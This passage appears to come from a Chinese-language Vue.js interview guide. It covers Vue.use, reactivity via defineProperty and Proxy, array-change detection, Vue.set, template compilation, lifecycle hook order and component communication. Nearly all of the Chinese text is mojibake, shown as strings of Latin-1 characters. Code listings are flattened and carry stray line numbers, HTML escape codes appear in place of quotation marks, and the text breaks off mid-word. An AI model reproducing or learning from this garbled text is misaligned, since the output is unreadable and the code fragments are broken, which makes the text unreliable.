ç¸½çµï¼šnew Vue()å‰µå»ºäº†æ ¹å¯¦ä¾‹ä¸¦æº–å‚™å¥½æ•¸æ“šå’Œæ–¹æ³•ï¼Œæœªä¾†åŸ·è¡Œæ›è¼‰æ™‚ï¼Œæ­¤éç¨‹é‚„æœƒéæ­¸çš„æ‡‰ç”¨æ–¼å®ƒçš„å­çµ„ä»¶ä¸Šï¼Œæœ€çµ‚å½¢æˆä¸€å€‹æœ‰ç·Šå¯†é—œä¿‚çš„çµ„ä»¶å¯¦ä¾‹æ¨¹ 3. Vue.useæ˜¯å¹¹ä»€éº¼çš„ï¼ŸåŸç†æ˜¯ä»€éº¼ï¼Ÿ vue.use æ˜¯ç”¨ä¾†ä½¿ç”¨æ’ä»¶çš„ï¼Œæˆ‘å€‘å¯ä»¥åœ¨æ’ä»¶ä¸­æ“´å±•å…¨å±€çµ„ä»¶ã€æŒ‡ä»¤ã€åŸå‹æ–¹æ³•ç­‰ã€‚ æª¢æŸ¥æ’ä»¶æ˜¯å¦è¨»å†Šï¼Œè‹¥å·²è¨»å†Šï¼Œå‰‡ç›´æ¥è·³å‡º è™•ç†å…¥åƒï¼Œå°‡ç¬¬ä¸€å€‹åƒæ•¸ä¹‹å¾Œçš„åƒæ•¸æ­¸é›†ï¼Œä¸¦åœ¨é¦–éƒ¨å¡å…¥ this ä¸Šä¸‹æ–‡ åŸ·è¡Œè¨»å†Šæ–¹æ³•ï¼Œèª¿ç”¨å®šç¾©å¥½çš„ install æ–¹æ³•ï¼Œå‚³å…¥è™•ç†çš„åƒæ•¸ï¼Œè‹¥æ²’æœ‰ install æ–¹æ³•ä¸¦ä¸”æ’ä»¶æœ¬èº«ç‚º function å‰‡ç›´æ¥é€²è¡Œè¨»å†Š æ’ä»¶ä¸èƒ½é‡è¤‡çš„åŠ è¼‰ï¼Œinstall æ–¹æ³•çš„ç¬¬ä¸€å€‹åƒæ•¸æ˜¯vueçš„æ§‹é€ å‡½æ•¸ï¼Œå…¶ä»–åƒæ•¸æ˜¯Vue.setä¸­é™¤äº†ç¬¬ä¸€å€‹åƒæ•¸çš„å…¶ä»–åƒæ•¸ï¼› ä»£ç¢¼ï¼šargs.unshift(this) èª¿ç”¨æ’ä»¶çš„install æ–¹æ³• ä»£ç¢¼ï¼štypeof plugin.install === \u0026ldquo;function\u0026rdquo; æ’ä»¶æœ¬èº«æ˜¯ä¸€å€‹å‡½æ•¸ï¼Œç›´æ¥è®“å‡½æ•¸åŸ·è¡Œã€‚ä»£ç¢¼ï¼šplugin.apply(null, args) ç·©å­˜æ’ä»¶ã€‚ä»£ç¢¼ï¼šinstalledPlugins.push(plugin) 4. è«‹èªªä¸€ä¸‹éŸ¿æ‡‰å¼æ•¸æ“šçš„ç†è§£ï¼Ÿ æ ¹æ“šæ•¸æ“šé¡å‹ä¾†åšä¸åŒè™•ç†ï¼Œæ•¸çµ„å’Œå°åƒé¡å‹ç•¶å€¼è®ŠåŒ–æ™‚å¦‚ä½•åŠ«æŒã€‚ å°è±¡å…§éƒ¨é€šédefineReactiveæ–¹æ³•ï¼Œä½¿ç”¨ Object.defineProperty() ç›£è½æ•¸æ“šå±¬æ€§çš„ get ä¾†é€²è¡Œæ•¸æ“šä¾è³´æ”¶é›†ï¼Œå†é€šé set ä¾†å®Œæˆæ•¸æ“šæ›´æ–°çš„æ´¾ç™¼ æ•¸çµ„å‰‡é€šéé‡å¯«æ•¸çµ„æ–¹æ³•ä¾†å¯¦ç¾çš„ã€‚æ“´å±•å®ƒçš„ 7 å€‹è®Šæ›´â½…æ³•ï¼Œé€šéç›£è½é€™äº›æ–¹æ³•å¯ä»¥åšåˆ°ä¾è³´æ”¶é›†å’Œæ´¾ç™¼æ›´æ–° å…§éƒ¨ä¾è³´æ”¶é›†æ˜¯æ€éº¼åšåˆ°çš„ï¼Ÿæ¯å€‹å±¬æ€§éƒ½æ“æœ‰è‡ªå·±çš„depå±¬æ€§ï¼Œå­˜æ”¾ä»–æ‰€ä¾è³´çš„ watcherï¼Œç•¶å±¬æ€§è®ŠåŒ–å¾Œæœƒé€šçŸ¥è‡ªå·±å°æ‡‰çš„ watcherå»æ›´æ–° éŸ¿æ‡‰å¼æµç¨‹ï¼š\ndefineReactive æŠŠæ•¸æ“šå®šç¾©æˆéŸ¿æ‡‰å¼çš„ çµ¦å±¬æ€§å¢åŠ ä¸€å€‹ depï¼Œç”¨ä¾†æ”¶é›†å°æ‡‰çš„é‚£äº›watcher ç­‰æ•¸æ“šè®ŠåŒ–é€²è¡Œæ›´æ–°\ndep.depend() // get å–å€¼ï¼šé€²è¡Œä¾è³´æ”¶é›†\ndep.notify() // set è¨­ç½®æ™‚ï¼šé€šçŸ¥è¦–åœ–æ›´æ–° å°è±¡å±¤ç´šéæ·±ï¼Œæ€§èƒ½å°±æœƒå·® ä¸éœ€è¦éŸ¿æ‡‰æ•¸æ“šçš„å…§å®¹ä¸è¦æ”¾åœ¨dataä¸­ object.freeze() å¯ä»¥å‡çµæ•¸æ“š 5. Vueå¦‚ä½•æª¢æ¸¬æ•¸çµ„è®ŠåŒ–ï¼Ÿ æ•¸çµ„è€ƒæ…®æ€§èƒ½åŸå› æ²’æœ‰ç”¨definePropertyå°æ•¸çµ„çš„æ¯ä¸€é …é€²è¡Œæ””æˆªï¼Œè€Œæ˜¯é¸æ“‡é‡å¯«æ•¸çµ„ æ–¹æ³•ä»¥é€²è¡Œé‡å¯«ã€‚ç•¶æ•¸çµ„èª¿ç”¨åˆ°é€™ 7 å€‹æ–¹æ³•çš„æ™‚å€™ï¼ŒåŸ·è¡Œ ob.dep.notify() é€²è¡Œæ´¾ç™¼é€šçŸ¥ Watcher æ›´æ–° åœ¨Vueä¸­ä¿®æ”¹æ•¸çµ„çš„ç´¢å¼•å’Œé•·åº¦æ˜¯ç„¡æ³•ç›£æ§åˆ°çš„ã€‚éœ€è¦é€šéä»¥ä¸‹7ç¨®è®Šç•°æ–¹æ³•ä¿®æ”¹æ•¸çµ„æ‰æœƒè§¸ç™¼æ•¸çµ„å°æ‡‰çš„wactheré€²è¡Œæ›´æ–°ã€‚æ•¸çµ„ä¸­å¦‚æœæ˜¯å°åƒæ•¸æ“šé¡å‹ä¹Ÿæœƒé€²è¡Œéæ­¸åŠ«æŒ é‚£å¦‚æœæƒ³è¦æ”¹ç´¢å¼•æ›´æ–°æ•¸æ“šæ€éº¼è¾¦ï¼Ÿ\nå¯ä»¥é€šéVue.set()ä¾†é€²è¡Œè™•ç† â æ ¸å¿ƒå…§éƒ¨ç”¨çš„æ˜¯ splice æ–¹æ³• 1 2 3 4 5 6 7 8 9 // å–å‡ºåŸå‹æ–¹æ³•ï¼› const arrayProto = Array.prototype // æ‹·è²åŸå‹æ–¹æ³•ï¼› export const arrayMethods = Object.create(arrayProto) // é‡å¯«æ•¸çµ„æ–¹æ³•ï¼› def(arrayMethods, method, function mutator (â€¦args) { } ob.dep.notify() // èª¿ç”¨æ–¹æ³•æ™‚æ›´æ–°è¦–åœ– 6. Vue.set æ–¹æ³•æ˜¯å¦‚ä½•å¯¦ç¾çš„ï¼Ÿ ç‚ºä»€éº¼$setå¯ä»¥è§¸ç™¼æ›´æ–°ï¼Œæˆ‘å€‘çµ¦å°è±¡å’Œæ•¸çµ„æœ¬èº«éƒ½å¢åŠ äº†depå±¬æ€§ï¼Œç•¶çµ¦å°åƒæ–°å¢ä¸å­˜åœ¨çš„å±¬æ€§å‰‡è§¸ç™¼å°è±¡ä¾è³´çš„watcherå»æ›´æ–°ï¼Œç•¶ä¿®æ”¹æ•¸çµ„ç´¢å¼•æ™‚æˆ‘å€‘èª¿ç”¨æ•¸çµ„æœ¬èº«çš„spliceæ–¹æ³•å»æ›´æ–°æ•¸çµ„ å®˜æ–¹å®šç¾© Vue.set(object, key, value)\n7. Vueä¸­æ¨¡æ¿ç·¨è­¯åŸç†ï¼Ÿ å¦‚ä½•å°‡templateè½‰æ›æˆrenderå‡½æ•¸(é€™è£¡è¦æ³¨æ„çš„æ˜¯æˆ‘å€‘åœ¨é–‹ç™¼æ™‚ç›¡é‡ä¸è¦ä½¿ç”¨templateï¼Œå› ç‚ºå°‡templateè½‰åŒ–æˆrenderæ–¹æ³•éœ€è¦åœ¨é‹è¡Œæ™‚é€²è¡Œç·¨è­¯æ“ä½œæœƒæœ‰æ€§èƒ½æè€—ï¼ŒåŒæ™‚å¼•ç”¨å¸¶æœ‰complieråŒ…çš„vueé«”ç©ä¹Ÿæœƒè®Šå¤§) é»˜èª.vueæ–‡ä»¶ä¸­çš„ templateè™•ç†æ˜¯é€šévue-loader ä¾†é€²è¡Œè™•ç†çš„ä¸¦ä¸æ˜¯é€šéé‹è¡Œæ™‚çš„ç·¨è­¯ å°‡ template æ¨¡æ¿è½‰æ›æˆ ast èªæ³•æ¨¹ - parserHTML å°éœæ…‹èªæ³•åšéœæ…‹æ¨™è¨˜ - markUp é‡æ–°ç”Ÿæˆä»£ç¢¼ - codeGen æ¨¡æ¿å¼•æ“çš„å¯¦ç¾åŸç†å°±æ˜¯new Function + withä¾†é€²è¡Œå¯¦ç¾çš„\nvue-loaderä¸­å¤„ç†templateå±æ€§ä¸»è¦é çš„æ˜¯ vue-template-compiler 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // vue-loader // template =\u0026gt; ast =\u0026gt; codegen =\u0026gt; with+function å¯¦ç¾ç”Ÿæˆrenderæ–¹æ³• let {ast, render } = VueTemplateCompiler.compile(\u0026lt;div\u0026gt;{{aaa}}\u0026lt;/div\u0026gt;) console.log(ast, render) // æ¨¡æ¿å¼•æ“çš„å¯¦ç¾åŸç† with + new Function console.log(new Function(render).tostring()) // renderæ–¹æ³•åŸ·è¡Œå®Œç•¢å¾Œç”Ÿæˆçš„æ˜¯è™›æ“¬ dom // with(this){return _c(â€˜divâ€™,[_s(aaa)])} // ä»£ç¢¼ç”Ÿæˆ const ast = parse(template.trim(), options) // å°‡ä»£ç¢¼è§£ææˆastèªæ³•æ¨¹ if (options.optimize !== false) { optimize(ast, options) // å„ªåŒ–ä»£ç¢¼ æ¨™è¨˜éœæ…‹é» æ¨™è¨˜æ¨¹ } const code = generate(ast, options) // ç”Ÿæˆä»£ç¢¼ 8. Proxy èˆ‡ Object.defineProperty å„ªåŠ£å°æ¯” Proxy çš„å„ªå‹¢å¦‚ä¸‹ Proxy å¯ä»¥ç›´æ¥ç›£è½å°è±¡è€Œéå±¬æ€§ Proxy å¯ä»¥ç›´æ¥ç›£è½æ•¸çµ„çš„è®ŠåŒ– Proxy æœ‰å¤šé” 13 ç¨®æ””æˆªæ–¹æ³•,ä¸é™æ–¼ applyã€ownKeysã€deletePropertyã€has ç­‰ç­‰æ˜¯ Object.defineProperty ä¸å…·å‚™çš„ Proxy è¿”å›çš„æ˜¯ä¸€å€‹æ–°å°è±¡,æˆ‘å€‘å¯ä»¥åªæ“ä½œæ–°çš„å°è±¡é”åˆ°ç›®çš„,è€Œ Object.defineProperty åªèƒ½éæ­·å°è±¡å±¬æ€§ç›´æ¥ä¿®æ”¹ Proxy ä½œç‚ºæ–°æ¨™æº–å°‡å—åˆ°ç€è¦½å™¨å» å•†é‡é»æŒçºŒçš„æ€§èƒ½å„ªåŒ–ï¼Œä¹Ÿå°±æ˜¯å‚³èªªä¸­çš„æ–°æ¨™æº–çš„æ€§èƒ½ç´…åˆ© Object.defineProperty çš„å„ªå‹¢å¦‚ä¸‹ å…¼å®¹æ€§å¥½ï¼Œæ”¯æŒ IE9ï¼Œè€Œ Proxy çš„å­˜åœ¨ç€è¦½å™¨å…¼å®¹æ€§å•é¡Œï¼Œè€Œä¸”ç„¡æ³•ç”¨ polyfill ç£¨å¹³ï¼Œå› æ­¤ Vue çš„ä½œè€…æ‰è²æ˜éœ€è¦ç­‰åˆ°ä¸‹å€‹å¤§ç‰ˆæœ¬( 3.0 )æ‰èƒ½ç”¨ Proxy é‡å¯« 9. Vue3.xéŸ¿æ‡‰å¼æ•¸æ“šåŸç† Vue3.xæ”¹ç”¨Proxyæ›¿ä»£Object.definePropertyã€‚å› ç‚ºProxyå¯ä»¥ç›´æ¥ç›£è½å°è±¡å’Œæ•¸çµ„çš„è®ŠåŒ–ï¼Œä¸¦ä¸”æœ‰å¤šé”13ç¨®æ””æˆªæ–¹æ³•ã€‚ä¸¦ä¸”ä½œç‚ºæ–°æ¨™æº–å°‡å—åˆ°ç€è¦½å™¨å» å•†é‡é»æŒçºŒçš„æ€§èƒ½å„ªåŒ– Proxyåªæœƒä»£ç†å°è±¡çš„ç¬¬ä¸€å±¤ï¼Œé‚£éº¼Vue3åˆæ˜¯æ€æ¨£è™•ç†é€™å€‹å•é¡Œçš„å‘¢ï¼Ÿ\nåˆ¤æ–·ç•¶å‰Reflect.getçš„è¿”å›å€¼æ˜¯å¦ç‚ºObjectï¼Œå¦‚æœæ˜¯å‰‡å†é€šéreactiveæ–¹æ³•åšä»£ç†ï¼Œ é€™æ¨£å°±å¯¦ç¾äº†æ·±åº¦è§€æ¸¬ ç›£æ¸¬æ•¸çµ„çš„æ™‚å€™å¯èƒ½è§¸ç™¼å¤šæ¬¡get/setï¼Œé‚£éº¼å¦‚ä½•é˜²æ­¢è§¸ç™¼å¤šæ¬¡å‘¢ï¼Ÿ\næˆ‘å€‘å¯ä»¥åˆ¤æ–·keyæ˜¯å¦ç‚ºç•¶å‰è¢«ä»£ç†å°è±¡targetè‡ªèº«å±¬æ€§ï¼Œä¹Ÿå¯ä»¥åˆ¤æ–·èˆŠå€¼èˆ‡æ–°å€¼æ˜¯å¦ç›¸ç­‰ï¼Œåªæœ‰æ»¿è¶³ä»¥ä¸Šå…©å€‹æ¢ä»¶ä¹‹ä¸€æ™‚ï¼Œæ‰æœ‰å¯èƒ½åŸ·è¡Œtrigger ç”Ÿå‘½å‘¨æœŸç¯‡ Vueçš„ç”Ÿå‘½é€±æœŸæ–¹æ³•æœ‰å“ªäº›ï¼Ÿä¸€èˆ¬åœ¨å“ªä¸€æ­¥ç™¼èµ·è«‹æ±‚åŠåŸå›  ç¸½å…±åˆ†ç‚º8å€‹éšæ®µï¼šå‰µå»ºå‰/å¾Œï¼Œè¼‰å…¥å‰/å¾Œï¼Œæ›´æ–°å‰/å¾Œï¼ŒéŠ·æ¯€å‰/å¾Œ å‰µå»ºå‰/å¾Œï¼š\nbeforeCreateéšæ®µï¼švueå¯¦ä¾‹çš„æ›è¼‰å…ƒç´ elå’Œæ•¸æ“šå°è±¡dataéƒ½ç‚ºundefinedï¼Œé‚„æœªåˆå§‹åŒ–ã€‚\nèªªæ˜ï¼šåœ¨ç•¶å‰éšæ®µdataã€methodsã€computedä»¥åŠwatchä¸Šçš„æ•¸æ“šå’Œæ–¹æ³•éƒ½ä¸èƒ½è¢«è¨ªå•ã€‚\ncreatedéšæ®µï¼švueå¯¦ä¾‹çš„æ•¸æ“šå°è±¡dataæœ‰äº†ï¼Œelé‚„æ²’æœ‰ã€‚\nèªªæ˜ï¼šå¯ä»¥åšä¸€äº›åˆå§‹æ•¸æ“šçš„ç²å–ï¼Œåœ¨ç•¶å‰éšæ®µç„¡æ³•èˆ‡Domé€²è¡Œäº¤äº’ï¼Œå¦‚æœéè¦æƒ³ï¼Œå¯ä»¥é€šévm.$nextTickä¾†è¨ªå•Domã€‚\nè¼‰å…¥å‰/å¾Œï¼š\nbeforeMountéšæ®µï¼švueå¯¦ä¾‹çš„$elå’Œdataéƒ½åˆå§‹åŒ–äº†ï¼Œä½†é‚„æ˜¯æ›è¼‰ä¹‹å‰ç‚ºè™›æ“¬çš„domç¯€é»ã€‚\nèªªæ˜ï¼šç•¶å‰éšæ®µè™›æ“¬Domå·²ç¶“å‰µå»ºå®Œæˆï¼Œå³å°‡é–‹å§‹æ¸²æŸ“ã€‚åœ¨æ­¤æ™‚ä¹Ÿå¯ä»¥å°æ•¸æ“šé€²è¡Œæ›´æ”¹ï¼Œä¸æœƒè§¸ç™¼updatedã€‚\nmountedéšæ®µï¼švueå¯¦ä¾‹æ›è¼‰å®Œæˆï¼Œdata.messageæˆåŠŸæ¸²æŸ“ã€‚\nèªªæ˜ï¼šåœ¨ç•¶å‰éšæ®µï¼ŒçœŸå¯¦çš„Domæ›è¼‰å®Œç•¢ï¼Œæ•¸æ“šå®Œæˆé›™å‘ç¶å®šï¼Œå¯ä»¥è¨ªå•åˆ°Domç¯€é»ï¼Œä½¿ç”¨$refså±¬æ€§å°Domé€²è¡Œæ“ä½œã€‚\næ›´æ–°å‰/å¾Œï¼š\nbeforeUpdateéšæ®µï¼šéŸ¿æ‡‰å¼æ•¸æ“šæ›´æ–°æ™‚èª¿ç”¨ï¼Œç™¼ç”Ÿåœ¨è™›æ“¬DOMæ‰“è£œä¸ä¹‹å‰ï¼Œé©åˆåœ¨æ›´æ–°ä¹‹å‰è¨ªå•ç¾æœ‰çš„DOMï¼Œæ¯”å¦‚æ‰‹å‹•ç§»é™¤å·²æ·»åŠ çš„äº‹ä»¶ç›£è½å™¨ã€‚\nèªªæ˜ï¼šå¯ä»¥åœ¨ç•¶å‰éšæ®µé€²è¡Œæ›´æ”¹æ•¸æ“šï¼Œä¸æœƒé€ æˆé‡æ¸²æŸ“ã€‚\nupdatedéšæ®µï¼šè™›æ“¬DOMé‡æ–°æ¸²æŸ“å’Œæ‰“è£œä¸ä¹‹å¾Œèª¿ç”¨ï¼Œçµ„æˆæ–°çš„DOMå·²ç¶“æ›´æ–°ï¼Œé¿å…åœ¨é€™å€‹é‰¤å­å‡½æ•¸ä¸­æ“ä½œæ•¸æ“šï¼Œé˜²æ­¢æ­»å¾ªç’°ã€‚\nèªªæ˜ï¼šç•¶å‰éšæ®µçµ„ä»¶Domå·²å®Œæˆæ›´æ–°ã€‚è¦æ³¨æ„çš„æ˜¯é¿å…åœ¨æ­¤æœŸé–“æ›´æ”¹æ•¸æ“šï¼Œå› ç‚ºé€™å¯èƒ½æœƒå°è‡´ç„¡é™å¾ªç’°çš„æ›´æ–°ã€‚\néŠ·æ¯€å‰/å¾Œï¼š\nbeforeDestroyéšæ®µï¼šå¯¦ä¾‹éŠ·æ¯€å‰èª¿ç”¨ï¼Œå¯¦ä¾‹é‚„å¯ä»¥ç”¨ï¼Œthisèƒ½ç²å–åˆ°å¯¦ä¾‹ï¼Œå¸¸ç”¨æ–¼éŠ·æ¯€å®šæ™‚å™¨ï¼Œè§£ç¶äº‹ä»¶ã€‚\nèªªæ˜ï¼šåœ¨ç•¶å‰éšæ®µå¯¦ä¾‹å®Œå…¨å¯ä»¥è¢«ä½¿ç”¨ï¼Œæˆ‘å€‘å¯ä»¥åœ¨é€™æ™‚é€²è¡Œå–„å¾Œæ”¶å°¾å·¥ä½œï¼Œæ¯”å¦‚æ¸…é™¤è¨ˆæ™‚å™¨ã€‚\ndestroyedéšæ®µï¼šå¯¦ä¾‹éŠ·æ¯€å¾Œèª¿ç”¨ï¼Œèª¿ç”¨å¾Œæ‰€æœ‰äº‹ä»¶ç›£è½å™¨æœƒè¢«ç§»é™¤ï¼Œæ‰€æœ‰çš„å­å¯¦ä¾‹éƒ½æœƒè¢«éŠ·æ¯€ã€‚\nèªªæ˜ï¼šç•¶å‰éšæ®µçµ„ä»¶å·²è¢«æ‹†è§£ï¼Œæ•¸æ“šç¶å®šè¢«å¸é™¤ï¼Œç›£è½è¢«ç§»å‡ºï¼Œå­å¯¦ä¾‹ä¹Ÿçµ±çµ±è¢«éŠ·æ¯€ã€‚\nè£œå……ï¼š\nç¬¬ä¸€æ¬¡é é¢åŠ è¼‰æ™‚æœƒè§¸ç™¼ï¼šbeforeCreate, created, beforeMount, mountedã€‚\ncreated å¯¦ä¾‹å·²ç¶“å‰µå»ºå®Œæˆï¼Œå› ç‚ºå®ƒæ˜¯æœ€æ—©è§¸ç™¼çš„åŸå› å¯ä»¥é€²è¡Œä¸€äº›æ•¸æ“šï¼Œè³‡æºçš„è«‹æ±‚ã€‚ (æœå‹™å™¨æ¸²æŸ“æ”¯æŒcreatedæ–¹æ³•) mounted å¯¦ä¾‹å·²ç¶“æ›è¼‰å®Œæˆï¼Œå¯ä»¥é€²è¡Œä¸€äº›DOMæ“ä½œã€‚ (æ¥å£è«‹æ±‚) ç”Ÿå‘½é€±æœŸé‰¤å­æ˜¯å¦‚ä½•å¯¦ç¾çš„ï¼Ÿ Vueçš„ç”Ÿå‘½é€±æœŸé‰¤å­å°±æ˜¯å›èª¿å‡½æ•¸è€Œå·²ï¼Œç•¶å‰µå»ºçµ„ä»¶å¯¦ä¾‹çš„éç¨‹ä¸­æœƒèª¿ç”¨å°æ‡‰çš„é‰¤å­æ–¹æ³•ã€‚ è£œå……ï¼š\nå…§éƒ¨ä¸»è¦æ˜¯ä½¿ç”¨callHookæ–¹æ³•ä¾†èª¿ç”¨å°æ‡‰çš„æ–¹æ³•ã€‚æ ¸å¿ƒæ˜¯ä¸€å€‹ç™¼å¸ƒè¨‚é–±æ¨¡å¼ï¼Œå°‡é‰¤å­è¨‚é–±å¥½(å…§éƒ¨æ¡ç”¨æ•¸çµ„çš„æ–¹å¼å­˜å„²)ï¼Œåœ¨å°æ‡‰çš„éšæ®µé€²è¡Œç™¼å¸ƒã€‚\nVue çš„çˆ¶çµ„ä»¶å’Œå­çµ„ä»¶ç”Ÿå‘½é€±æœŸé‰¤å­åŸ·è¡Œé †åº ç¬¬ä¸€æ¬¡é é¢åŠ è¼‰æ™‚æœƒè§¸ç™¼ beforeCreate, created, beforeMount, mounted é€™å¹¾å€‹é‰¤å­ã€‚ æ¸²æŸ“éç¨‹ï¼š çˆ¶çµ„ä»¶æ›è¼‰å®Œæˆä¸€å®šæ˜¯ç­‰å­çµ„ä»¶éƒ½æ›è¼‰å®Œæˆå¾Œï¼Œæ‰ç®—æ˜¯çˆ¶çµ„ä»¶æ›è¼‰å®Œï¼Œæ‰€ä»¥çˆ¶çµ„ä»¶çš„mountedåœ¨å­çµ„ä»¶moutedä¹‹å¾Œ\nçˆ¶beforeCreate â¡ çˆ¶created â¡ çˆ¶beforeMount â¡ å­beforeCreate â¡ å­created â¡ å­beforeMount â¡ å­mounted â¡ çˆ¶mounted\nå­çµ„ä»¶æ›´æ–°éç¨‹ï¼š å½±éŸ¿åˆ°çˆ¶çµ„ä»¶ï¼šçˆ¶beforeUpdate -\u0026gt; å­beforeUpdate-\u0026gt;å­updated -\u0026gt; çˆ¶updted\nä¸å½±éŸ¿çˆ¶çµ„ä»¶ï¼šå­beforeUpdate -\u0026gt; å­updated\nçˆ¶çµ„ä»¶æ›´æ–°éç¨‹ï¼š å½±éŸ¿åˆ°å­çµ„ä»¶ï¼šçˆ¶beforeUpdate -\u0026gt; å­beforeUpdate-\u0026gt;å­updated -\u0026gt; çˆ¶updted\nä¸å½±éŸ¿å­çµ„ä»¶ï¼šçˆ¶beforeUpdate -\u0026gt; çˆ¶updated\néŠ·æ¯€éç¨‹ï¼š çˆ¶beforeDestroy -\u0026gt; å­beforeDestroy -\u0026gt; å­destroyed -\u0026gt; çˆ¶destroyed\né‡è¦ï¼šçˆ¶çµ„ä»¶ç­‰å¾…å­çµ„ä»¶å®Œæˆå¾Œï¼Œæ‰æœƒåŸ·è¡Œè‡ªå·±å°æ‡‰å®Œæˆçš„é‰¤å­ã€‚\nçµ„ä»¶é€šä¿¡ç¯‡ Vueä¸­çš„çµ„ä»¶çš„data ç‚ºä»€éº¼æ˜¯ä¸€å€‹å‡½æ•¸ï¼Ÿ æ¯æ¬¡ä½¿ç”¨çµ„ä»¶æ™‚éƒ½æœƒå°çµ„ä»¶é€²è¡Œå¯¦ä¾‹åŒ–æ“ä½œï¼Œä¸¦ä¸”èª¿ç”¨dataå‡½æ•¸è¿”å›ä¸€å€‹å°åƒä½œç‚ºçµ„ä»¶çš„æ•¸æ“šæºã€‚é€™æ¨£å¯ä»¥ä¿è­‰å¤šå€‹çµ„ä»¶é–“æ•¸æ“šäº’ä¸å½±éŸ¿ã€‚ å¦‚æœdataæ˜¯å°è±¡çš„è©±ï¼Œå°è±¡å±¬æ–¼å¼•ç”¨é¡å‹ï¼Œæœƒå½±éŸ¿åˆ°æ‰€æœ‰çš„å¯¦ä¾‹ã€‚æ‰€ä»¥ç‚ºäº†ä¿è­‰çµ„ä»¶ä¸åŒçš„å¯¦ä¾‹ä¹‹é–“dataä¸è¡çªï¼Œdataå¿…é ˆæ˜¯ä¸€å€‹å‡½æ•¸ã€‚ Vue çµ„ä»¶é–“é€šä¿¡æœ‰å“ªå¹¾ç¨®æ–¹å¼ï¼Ÿ Vue çµ„ä»¶é–“é€šä¿¡åªè¦æŒ‡ä»¥ä¸‹ 3 é¡é€šä¿¡ï¼šçˆ¶å­çµ„ä»¶é€šä¿¡ã€éš”ä»£çµ„ä»¶é€šä¿¡ã€å…„å¼Ÿçµ„ä»¶é€šä¿¡ï¼Œä¸‹é¢æˆ‘å€‘åˆ†åˆ¥ä»‹ç´¹æ¯ç¨®é€šä¿¡æ–¹å¼ä¸”æœƒèªªæ˜æ­¤ç¨®æ–¹æ³•å¯é©ç”¨æ–¼å“ªé¡çµ„ä»¶é–“é€šä¿¡ã€‚ props / $emit é©ç”¨çˆ¶å­çµ„ä»¶é€šä¿¡\né€™ç¨®æ–¹æ³•æ˜¯ Vue çµ„ä»¶çš„åŸºç¤ï¼Œç›¸ä¿¡å¤§éƒ¨åˆ†åŒå­¸è€³èèƒ½è©³ï¼Œæ‰€ä»¥æ­¤è™•å°±ä¸èˆ‰ä¾‹å±•é–‹ä»‹ç´¹ã€‚ ref èˆ‡ $parent / childrené€‚ç”¨çˆ¶å­ç»„ä»¶é€šä¿¡\nrefï¼šå¦‚æœåœ¨æ™®é€šçš„DOMå…ƒç´ ä¸Šä½¿ç”¨ï¼Œå¼•ç”¨æŒ‡å‘çš„å°±æ˜¯DOMå…ƒç´ ï¼›å¦‚æœç”¨åœ¨å­çµ„ä»¶ä¸Šï¼Œå¼•ç”¨å°±æŒ‡å‘çµ„ä»¶å¯¦ä¾‹ parent / $childrenï¼šè¨ªå•çˆ¶ / å­å¯¦ä¾‹ EventBus ï¼ˆ$emit / $onï¼‰ é©ç”¨æ–¼ çˆ¶å­ã€éš”ä»£ã€å…„å¼Ÿçµ„ä»¶é€šä¿¡\né€™ç¨®æ–¹æ³•é€šéä¸€å€‹ç©ºçš„ Vue å¯¦ä¾‹ä½œç‚ºä¸­å¤®äº‹ä»¶ç¸½ç·šï¼ˆäº‹ä»¶ä¸­å¿ƒï¼‰ï¼Œç”¨å®ƒä¾†è§¸ç™¼äº‹ä»¶å’Œç›£è½äº‹ä»¶ï¼Œå¾è€Œå¯¦ç¾ä»»ä½•çµ„ä»¶é–“çš„é€šä¿¡ï¼ŒåŒ…æ‹¬çˆ¶å­ã€éš”ä»£ã€å…„å¼Ÿçµ„ä»¶ã€‚ attrs / listeners é©ç”¨æ–¼éš”ä»£çµ„ä»¶é€šä¿¡\nattrsï¼šåŒ…å«äº†çˆ¶ä½œç”¨åŸŸä¸­ä¸è¢«propæ‰€è­˜åˆ¥(ä¸”ç²å–)çš„ç‰¹æ€§ç¶å®š(classå’Œstyleé™¤å¤–)ã€‚ç•¶ä¸€å€‹çµ„ä»¶æ²’æœ‰è²æ˜ä»»ä½•propæ™‚ï¼Œé€™è£¡æœƒåŒ…å«æ‰€æœ‰çˆ¶ä½œç”¨åŸŸçš„ç¶å®š(classå’Œstyleé™¤å¤–)ï¼Œä¸¦ä¸”å¯ä»¥é€šévâˆ’bind=\u0026ldquo;attrs\u0026rdquo; å‚³å…¥å…§éƒ¨çµ„ä»¶ã€‚é€šå¸¸é…åˆ inheritAttrs é¸é …ä¸€èµ·ä½¿ç”¨ã€‚ listenersï¼šåŒ…å«äº†çˆ¶ä½œç”¨åŸŸä¸­çš„(ä¸å«.nativeä¿®é£¾å™¨çš„) v-onäº‹ä»¶ç›£è½å™¨ã€‚å®ƒå¯ä»¥é€šévâˆ’on=\u0026ldquo;listeners\u0026rdquo; å‚³å…¥å…§éƒ¨çµ„ä»¶ provide / inject é©ç”¨æ–¼éš”ä»£çµ„ä»¶é€šä¿¡\nç¥–å…ˆçµ„ä»¶ä¸­é€šé provider ä¾†æä¾›è®Šé‡ï¼Œç„¶å¾Œåœ¨å­å­«çµ„ä»¶ä¸­é€šé inject ä¾†æ³¨å…¥è®Šé‡ã€‚ provide / inject API ä¸»è¦è§£æ±ºäº†è·¨ç´šçµ„ä»¶é–“çš„é€šä¿¡å•é¡Œï¼Œä¸éå®ƒçš„ä½¿ç”¨å ´æ™¯ï¼Œä¸»è¦æ˜¯å­çµ„ä»¶ç²å–ä¸Šç´šçµ„ä»¶çš„ç‹€æ…‹ï¼Œè·¨ç´šçµ„ä»¶é–“å»ºç«‹äº†ä¸€ç¨®ä¸»å‹•æä¾›èˆ‡ä¾è³´æ³¨å…¥çš„é—œä¿‚ã€‚ Vuex é©ç”¨æ–¼ çˆ¶å­ã€éš”ä»£ã€å…„å¼Ÿçµ„ä»¶é€šä¿¡\nVuex æ˜¯ä¸€å€‹å°ˆç‚º Vue.js æ‡‰ç”¨ç¨‹åºé–‹ç™¼çš„ç‹€æ…‹ç®¡ç†æ¨¡å¼ã€‚æ¯ä¸€å€‹ Vuex æ‡‰ç”¨çš„æ ¸å¿ƒå°±æ˜¯ storeï¼ˆå€‰åº«ï¼‰ã€‚ \u0026ldquo;store\u0026rdquo; åŸºæœ¬ä¸Šå°±æ˜¯ä¸€å€‹å®¹å™¨ï¼Œå®ƒåŒ…å«è‘—ä½ çš„æ‡‰ç”¨ä¸­å¤§éƒ¨åˆ†çš„ç‹€æ…‹ (state)ã€‚ çµ„ä»¶ä¸­å¯« nameé¸é 